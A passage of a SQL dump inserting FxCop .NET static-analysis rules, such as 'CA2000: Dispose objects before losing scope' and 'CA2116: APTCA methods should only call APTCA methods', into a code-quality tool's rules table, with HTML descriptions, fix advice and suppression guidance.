  &lt;forward name=''update'' path=''/WEB-INF/jsp/BookUpdate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''delete'' path=''/WEB-INF/jsp/BookDelete.jspx'' redirect=''false''/&gt;
  &lt;forward name=''authorRead'' path=''WEB-INF/jsp/AuthorDetails'' redirect=''false''/&gt;  &lt;!-- Noncompliant --&gt;
&lt;/action&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;action path=''/book'' type=''myapp.BookDispatchAction'' name=''bookForm'' parameter=''method''&gt;
  &lt;forward name=''create'' path=''/WEB-INF/jsp/BookCreate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''read'' path=''/WEB-INF/jsp/BookDetails'' redirect=''false''/&gt;
  &lt;forward name=''update'' path=''/WEB-INF/jsp/BookUpdate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''delete'' path=''/WEB-INF/jsp/BookDelete.jspx'' redirect=''false''/&gt;
&lt;/action&gt;

&lt;action path=''/author'' type=''myapp.AuthorDispatchAction'' name=''authorForm'' parameter=''method''&gt;
  &lt;forward name=''authorRead'' path=''WEB-INF/jsp/AuthorDetails'' redirect=''false''/&gt;
&lt;/action&gt;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '20min', NULL, NULL, 'per extra forward', NULL, 'brain-overload,struts', false, 'HTML', 1510817812722, 1510817812723, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (636, 'CA1806: Do not ignore method results', 'DoNotIgnoreMethodResults', 'CA1806', 'fxcop', '<h2>Cause</h2>
<p>
            There are several possible reasons for this warning:
            <ul>
              <li>
                A new object is created but never used.
              </li>
              <li>
                A method that creates and returns a new string is called and the new string is never used.
              </li>
              <li>
                A COM or P/Invoke method that returns a HRESULT or error code that is never used. Rule Description
              </li>
            </ul>
            Unnecessary object creation and the associated garbage collection of the unused object degrade performance.
            Strings are immutable and methods such as String.ToUpper returns a new instance of a string instead of modifying the instance of the string in the calling method.
            Ignoring HRESULT or error code can lead to unexpected behavior in error conditions or to low-resource conditions.
</p>
<h2>How to Fix Violations</h2>
<p>
            If method A creates a new instance of B object that is never used, pass the instance as an argument to another method or assign the instance to a variable. If the object creation is unnecessary, remove the it.-or-
            If method A calls method B, but does not use the new string instance that the method B returns. Pass the instance as an argument to another method, assign the instance to a variable. Or remove the call if it is unnecessary.
            -or-
            If method A calls method B, but does not use the HRESULT or error code that the method returns. Use the result in a conditional statement, assign the result to a variable, or pass it as an argument to another method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule unless the act of creating the object serves some purpose.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182273.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182273.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812594, 1510817812594, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (637, 'CA2214: Do not call overridable methods in constructors', 'DoNotCallOverridableMethodsInConstructors', 'CA2214', 'fxcop', '<h2>Cause</h2>
<p>
            The constructor of an unsealed type calls a virtual method defined in its class.
</p>
<h2>Rule Description</h2>
<p>
            When a virtual method is called, the actual type that executes the method is not selected until run time. When a constructor calls a virtual method, it is possible that the constructor for the instance that invokes the method has not executed.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, do not call a type''s virtual methods from within the type''s constructors.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. The constructor should be redesigned to eliminate the call to the virtual method.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182331.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182331.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812595, 1510817812595, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (638, 'CA1058: Types should not extend certain base types', 'TypesShouldNotExtendCertainBaseTypes', 'CA1058', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type extends certain base types. Currently, this rule reports types that derive from the following types:
            <ul>
              <li>


                    <code>System.ApplicationException</code>


              </li>
              <li>


                    <code>System.Xml.XmlDocument</code>


              </li>
              <li>


                    <code>System.Collections.CollectionBase</code>


              </li>
              <li>


                    <code>System.Collections.DictionaryBase</code>


              </li>
              <li>


                    <code>System.Collections.Queue</code>


              </li>
              <li>


                    <code>System.Collections.ReadOnlyCollectionBase</code>


              </li>
              <li>


                    <code>System.Collections.SortedList</code>


              </li>
              <li>


                    <code>System.Collections.Stack</code>


              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            For .NET Framework version 1, it was recommended to derive new exceptions from <code>ApplicationException</code>. The recommendation has changed and new exceptions should derive from <code>System.Exception</code> or one of its subclasses in the <code>System</code> namespace.
            Do not create a subclass of <code>XmlDocument</code> if you want to create an XML view of an underlying object model or data source.






                    Non-generic Collections










                Use and/or extend generic collections whenever possible. Do not extend non-generic collections in your code, unless you shipped it previously.

                  Examples of Incorrect Usage










            <pre>
public class MyCollection : CollectionBase
{
}

public class MyReadOnlyCollection : ReadOnlyCollectionBase
{
}
</pre>




Examples of Correct Usage









            <pre>
public class MyCollection : Collection&lt;T&gt;
{
}

public class MyReadOnlyCollection : ReadOnlyCollection&lt;T&gt;
{
}
</pre>






</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, derive the type from a different base type or a generic collection.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule for violations about <code>ApplicationException</code>. It is safe to suppress a warning from this rule for violations about <code>XmlDocument</code>. It is safe to suppress a warning about a non-generic collection if the code was released previously.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182171.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182171.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812596, 1510817812597, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (639, 'CA1065: Do not raise exceptions in unexpected locations', 'DoNotRaiseExceptionsInUnexpectedLocations', 'CA1065', 'fxcop', '<h2>Cause</h2>
<p>
            A method that is not expected to throw exceptions throws an exception.
</p>
<h2>Rule Description</h2>

<h3>Property Get Methods</h3>
<p>
                Properties are basically smart fields. Therefore, they should behave like a field as much as possible. Fields do not throw exceptions and neither should properties. If you have a property that throws an exception, consider making it a method.
                The following exceptions are allowed to be thrown from a property get method:
                <ul>
                  <li>


                        <code>System.InvalidOperationException</code>
                       and all derivatives (including <code>System.ObjectDisposedException</code>)
                  </li>
                  <li>


                        <code>System.NotSupportedException</code>
                       and all derivatives
                  </li>
                  <li>


                        <code>System.ArgumentException</code>
                       (only from indexed get)
                  </li>
                  <li>


                        <code>KeyNotFoundException</code>
                       (only from indexed get)
                  </li>
                </ul>
</p>
<h3>Event Accessor Methods</h3>
<p>
                Event accessors should be simple operations that do not throw exceptions. An event should not throw an exception when you try to add or remove an event handler.
                The following exceptions are allowed to be thrown from an event accesor:
                <ul>
                  <li>


                        <code>System.InvalidOperationException</code>
                       and all derivatives (including <code>System.ObjectDisposedException</code>)
                  </li>
                  <li>


                        <code>System.NotSupportedException</code>
                       and all derivatives
                  </li>
                  <li>


                        <code>ArgumentException</code>
                       and derivatives
                  </li>
                </ul>
</p>
<h3>Equals Methods</h3>
<p>
                The following Equals methods should not throw exceptions:
                <ul>
                  <li>


                        <code>Object.Equals</code>


                  </li>
                  <li>

                      M:IEquatable.Equals

                  </li>
                </ul>
                An Equals method should return <code>true</code> or <code>false</code> instead of throwing an exception. For example, if Equals is passed two mismatched types it should just return <code>false</code> instead of throwing an <code>ArgumentException</code>.
</p>
<h3>GetHashCode Methods</h3>
<p>
                The following GetHashCode methods should usually not throw exceptions:
                <ul>
                  <li>


                        <code>GetHashCode</code>


                  </li>
                  <li>

                      M:IEqualityComparer.GetHashCode(T)

                  </li>
                </ul>

                  GetHashCode should always return a value. Otherwise, you can lose items in the hash table.
                The versions of GetHashCode that take an argument can throw an <code>ArgumentException</code>. However, Object.GetHashCode should never throw an exception.
</p>
<h3>ToString Methods</h3>
<p>
                The debugger uses <code>Object.ToString</code> to help display information about objects in string format. Therefore, ToString should not change the state of an object and it should not throw exceptions.
</p>
<h3>Static Constructors</h3>
<p>
                Throwing exceptions from a static constructor causes the type to be unusable in the current application domain. You should have a very good reason (such as a security issue) for throwing an exception from a static constructor.
</p>
<h3>Finalizers</h3>
<p>
                Throwing an exception from a finalizer causes the CLR to fail fast, which tears down the process. Therefore, throwing exceptions in a finalizer should always be avoided.
</p>
<h3>Dispose Methods</h3>
<p>
                A <code>IDisposable.Dispose</code> method should not throw an exception. Dispose is often called as part of the clean up logic in a <code>finally</code> clause. Therefore, explicitly throwing an exception from Dispose forces the user to add exception handling inside the <code>finally</code> clause.
                The Dispose(false) code path should never throw exceptions, because this is almost always called from a finalizer.
</p>
<h3>Equality Operators (==, !=)</h3>
<p>
                Like Equals methods, equality operators should return either <code>true</code> or <code>false</code> and should not throw exceptions.
</p>
<h3>Implicit Cast Operators</h3>
<p>
                Because the user is often unaware that an implicit cast operator has been called, an exception thrown by the implicit cast operator is completely unexpected. Therefore, no exceptions should be thrown from implicit cast operators.
</p>
<h2>How to Fix Violations</h2>
<p>
            For property getters, either change the logic so that it no longer has to throw an exception, or change the property into a method.
            For all other method types listed previously, change the logic so that it no longer must throw an exception.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the violation was caused by an exception declaration instead of a thrown exception.
</p>
<h2>Related Rules</h2>
<p>


                CA2219: Do not raise exceptions in exception clauses


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb386039.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386039.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812597, 1510817812598, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (640, 'CA1821: Remove empty finalizers', 'RemoveEmptyFinalizers', 'CA1821', 'fxcop', '<h2>Cause</h2>
<p>
            A type implements a finalizer that is empty, calls only the base type finalizer, or calls only conditionally emitted methods.
</p>
<h2>Rule Description</h2>
<p>
            Whenever you can, avoid finalizers because of the additional performance overhead that is involved in tracking object lifetime. The garbage collector will run the finalizer before it collects the object. This means that two collections will be required to collect the object. An empty finalizer incurs this added overhead without any benefit.
</p>
<h2>How to Fix Violations</h2>
<p>
            Remove the empty finalizer. If a finalizer is required for debugging, enclose the whole finalizer in #if DEBUG / #endif directives.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a message from this rule. Failure to suppress finalization decreases performance and provides no benefits.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264476.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264476.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812599, 1510817812600, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (641, 'CA2121: Static constructors should be private', 'StaticConstructorsShouldBePrivate', 'CA2121', 'fxcop', '<h2>Cause</h2>
<p>
            A type has a static constructor that is not private.
</p>
<h2>Rule Description</h2>
<p>
            A static constructor, also known as a class constructor, is used to initialize a type. The system calls the static constructor before the first instance of the type is created or any static members are referenced. The user has no control over when the static constructor is called. If a static constructor is not private, it can be called by code other than the system. Depending on the operations that are performed in the constructor, this can cause unexpected behavior.
            This rule is enforced by the C# and Visual Basic .NET compilers.
</p>
<h2>How to Fix Violations</h2>
<p>
            Violations are typically caused by one of the following actions:
            <ul>
              <li>
                You defined a static constructor for your type and did not make it private.
              </li>
              <li>
                The programming language compiler added a default static constructor to your type and did not make it private.
              </li>
            </ul>
            To fix the first kind of violation, make your static constructor private. To fix the second kind, add a private static constructor to your type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress these violations. If your software design requires an explicit call to a static constructor, it is likely that the design contains serious flaws and should be reviewed.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182320.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182320.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812600, 1510817812601, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (642, 'CA1056: URI properties should not be strings', 'UriPropertiesShouldNotBeStrings', 'CA1056', 'fxcop', '<h2>Cause</h2>
<p>
            A type declares a string property whose name contains "uri", "Uri", "urn", "Urn", "url", or "Url".
</p>
<h2>Rule Description</h2>
<p>
            This rule splits the property name into tokens based on the Pascal casing convention and checks whether each token equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the rule assumes that the property represents a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>System.Uri</code> class provides these services in a safe and secure manner.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the property to a <code>Uri</code> type.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the property does not represent a URI.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>




                {rule:fxcop:UriReturnValuesShouldNotBeStrings}<br/>




                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>




                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182175.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182175.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812602, 1510817812602, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (643, 'CA1719: Parameter names should not match member names', 'ParameterNamesShouldNotMatchMemberNames', 'CA1719', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an externally visible member matches, in a case-insensitive comparison, the name of one of its parameters.
</p>
<h2>Rule Description</h2>
<p>
            A parameter name should communicate the meaning of a parameter and a member name should communicate the meaning of a member. It would be a rare design where these were the same. Naming a parameter the same as its member name is unintuitive and makes the library difficult to use.
</p>
<h2>How to Fix Violations</h2>
<p>
            Select a parameter name that does not match the member name.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            For new development, no known scenarios occur where you must suppress a warning from this rule. For shipping libraries, you might have to suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>




                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}<br/>




                {rule:fxcop:IdentifiersShouldNotContainUnderscores}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182252.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182252.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812603, 1510817812603, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (644, 'CA2146: Types must be at least as critical as their base types and interfaces', 'TypesMustBeAtLeastAsCriticalAsBaseTypes', 'CA2146', 'fxcop', '<h2>Cause</h2>
<p>
            A transparent type is derived from a type that is marked with the <code>SecuritySafeCriticalAttribute</code> or the <code>SecurityCriticalAttribute</code>, or a type that is marked with the <code>SecuritySafeCriticalAttribute</code> attribute is derived from a type that is marked with the <code>SecurityCriticalAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>
            This rule fires when a derived type has a security transparency attribute that is not as critical as its base type or implemented interface. Only critical types can derive from critical base types or implement critical interfaces, and only critical or safe-critical types can derive from safe-critical base types or implement safe-critical interfaces. Violations of this rule in level 2 transparency result in a <code>TypeLoadException</code> for the derived type.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix this violation, mark the derived or implementing type with a transparency attribute that is at least as critical as the base type or interface.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997443.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997443.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812604, 1510817812604, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (645, 'CA1711: Identifiers should not have incorrect suffix', 'IdentifiersShouldNotHaveIncorrectSuffix', 'CA1711', 'fxcop', '<h2>Cause</h2>
<p>
            An identifier has an incorrect suffix.
</p>
<h2>Rule Description</h2>
<p>
            By convention, only the names of types that extend certain base types or that implement certain interfaces, or types derived from these types, should end with specific reserved suffixes. Other type names should not use these reserved suffixes.
            The following table lists the reserved suffixes and the base types and interfaces with which they are associated.







                    Suffix


                    Base type/Interface




                    Attribute




                        <code>System.Attribute</code>






                    Collection




                        <code>System.Collections.ICollection</code>




                        <code>System.Collections.IEnumerable</code>




                        <code>System.Collections.Queue</code>




                        <code>System.Collections.Stack</code>




                        <code>System.Collections.Generic.ICollection&lt;T&gt;</code>




                        <code>System.Data.DataSet</code>




                        <code>System.Data.DataTable</code>






                    Dictionary




                        <code>System.Collections.IDictionary</code>




                        System.Collections.Generic.IDictionary&lt;TKey, TValue&gt;






                    EventArgs




                        <code>System.EventArgs</code>






                    EventHandler


                    An event-handler delegate




                    Exception




                        <code>System.Exception</code>






                    Permission




                        <code>System.Security.IPermission</code>






                    Queue




                        <code>System.Collections.Queue</code>






                    Stack




                        <code>System.Collections.Stack</code>






                    Stream




                        <code>System.IO.Stream</code>






            In addition, the following suffixes should not be used:
            <ul>
              <li>
                Delegate
              </li>
              <li>
                Enum
              </li>
              <li>
                Impl - use ''Core'' instead
              </li>
              <li>
                Ex or similar suffix to distinguish it from an earlier version of the same type
              </li>
            </ul>
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Remove the suffix from the type name.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule unless the suffix has an unambiguous meaning in the application domain.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldHaveCorrectSuffix}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182247.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182247.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812605, 1510817812605, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (646, 'CA2216: Disposable types should declare finalizer', 'DisposableTypesShouldDeclareFinalizer', 'CA2216', 'fxcop', '<h2>Cause</h2>
<p>
            A type that implements <code>System.IDisposable</code>, and has fields that suggest the use of unmanaged resources, does not implement a finalizer as described by <code>Object.Finalize</code>.
</p>
<h2>Rule Description</h2>
<p>
            A violation of this rule is reported if the disposable type contains fields of the following types:
            <ul>
              <li>


                    <code>System.IntPtr</code>


              </li>
              <li>


                    <code>System.UIntPtr</code>


              </li>
              <li>


                    <code>System.Runtime.InteropServices.HandleRef</code>


              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement a finalizer that calls your <code>Dispose</code> method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the type does not implement <code>IDisposable</code> for the purpose of releasing unmanaged resources.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallGCKeepAliveWhenUsingNativeResources}<br/>




                {rule:fxcop:CallGCSuppressFinalizeCorrectly}<br/>




                {rule:fxcop:TypesThatOwnNativeResourcesShouldBeDisposable}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182329.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182329.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812606, 1510817812607, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (647, 'CA2000: Dispose objects before losing scope', 'DisposeObjectsBeforeLosingScope', 'CA2000', 'fxcop', '<h2>Cause</h2>
<p>
            A local object of a <code>IDisposable</code> type is created but the object is not disposed before all references to the object are out of scope.
</p>
<h2>Rule Description</h2>
<p>
            If a disposable object is not explicitly disposed before all references to it are out of scope, the object will be disposed at some indeterminate time when the garbage collector runs the finalizer of the object. Because an exceptional event might occur that will prevent the finalizer of the object from running, the object should be explicitly disposed instead.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call <code>Dispose</code> on the object before all references to it are out of scope.
            Note that you can use the <code>using</code> statement (<code>Using</code> in Visual Basic) to wrap objects that implement <code>IDisposable</code>. Objects that are wrapped in this manner will automatically be disposed at the close of the <code>using</code> block.
            The following are some situations where the using statement is not enough to protect IDisposable objects and can cause CA2000 to occur.
            <ul>
              <li>
                Returning a disposable object requires that the object is constructed in a try/finally block outside a using block.
              </li>
              <li>
                Initializing members of a disposable object should not be done in the constructor of a using statement.
              </li>
              <li>
                Nesting constructors that are protected only by one exception handler. For example,









            <pre>
using (StreamReader sr = new StreamReader(new FileStream("C:\myfile.txt", FileMode.Create)))
{ ... }
</pre>




causes CA2000 to occur because a failure in the construction of the StreamReader object can result in the FileStream object never being closed.</li>
              <li>
                Dynamic objects should use a shadow object to implement the Dispose pattern of IDisposable objects.
              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule unless you have called a method on your object that calls <code>Dispose</code>, such as <code>Close</code>, or if the method that raised the warning returns an IDisposable object wraps your object.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DisposableFieldsShouldBeDisposed}<br/>




                {rule:fxcop:DoNotDisposeObjectsMultipleTimes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182289.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182289.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812607, 1510817812608, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (648, 'CA2116: APTCA methods should only call APTCA methods', 'AptcaMethodsShouldOnlyCallAptcaMethods', 'CA2116', 'fxcop', '<h2>Cause</h2>
<p>
            A method in an assembly with the <code>System.Security.AllowPartiallyTrustedCallersAttribute</code> attribute calls a method in an assembly that does not have the attribute.
</p>
<h2>Rule Description</h2>
<p>
            By default, public or protected methods in assemblies with strong names are implicitly protected by a Link Demands for full trust; only fully trusted callers can access a strong-named assembly. Strong-named assemblies marked with the <code>AllowPartiallyTrustedCallersAttribute</code> (APTCA) attribute do not have this protection. The attribute disables the link demand, making the assembly accessible to callers that do not have full trust, such as code executing from an intranet or the Internet.
            When the APTCA attribute is present on a fully trusted assembly, and the assembly executes code in another assembly that does not allow partially trusted callers, a security exploit is possible. If two methods M1 and M2 meet the following conditions, malicious callers can use the method M1 to bypass the implicit full trust link demand that protects M2:
            <ul>
              <li>

                  M1 is a public method declared in a fully trusted assembly that has the APTCA attribute.
              </li>
              <li>

                  M1 calls a method M2 outside M1''s assembly.
              </li>
              <li>

                  M2''s assembly does not have the APTCA attribute and, therefore, should not be executed by or on behalf of callers that are partially trusted.
              </li>
            </ul>
            A partially trusted caller X can call method M1, causing M1 to call M2. Because M2 does not have the APTCA attribute, its immediate caller (M1) must satisfy a link demand for full trust; M1 has full trust and therefore satisfies this check. The security risk is because X does not participate in satisfying the link demand that protects M2 from untrusted callers. Therefore, methods with the APTCA attribute must not call methods that do not have the attribute.
</p>
<h2>How to Fix Violations</h2>
<p>
            If the APCTA attribute is required, use a demand to protect the method that calls into the full trust assembly. The exact permissions you demand will depend on the functionality exposed by your method. If it is possible, protect the method with a demand for full trust to ensure that the underlying functionality is not exposed to partially trusted callers. If this is not possible, select a set of permissions that effectively protects the exposed functionality. For more information about demands, see <code>Demands</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            To safely suppress a warning from this rule, you must ensure that the functionality exposed by your method does not directly or indirectly allow callers to access sensitive information, operations, or resources that can be used in a destructive manner.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AptcaTypesShouldOnlyExtendAptcaBaseTypes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182297.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182297.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812609, 1510817812609, 1);
